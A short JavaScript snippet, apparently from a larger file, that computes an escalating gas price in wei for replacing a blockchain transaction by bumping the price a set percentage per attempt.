// ============================================================
// GAS PRICE
// ============================================================

function calculateReplacementGasPrice(
    baseGasPriceWei,
    replacementNumber
) {

    if (
        replacementNumber === 0
    ) {

        return baseGasPriceWei;
    }

    let price =
        baseGasPriceWei;

    for (
        let i = 0;
        i < replacementNumber;
        i++
    ) {

        const numerator =
            price *
            BigInt(
                100 +
                REPLACEMENT_BUMP_PERCENT
            );

        let bumped =
            numerator /
            100n;

        if (
            bumped <= price
        ) {

            bumped =
                price + 1n;
        }

        price =
            bumped;
    }

    return price;
}

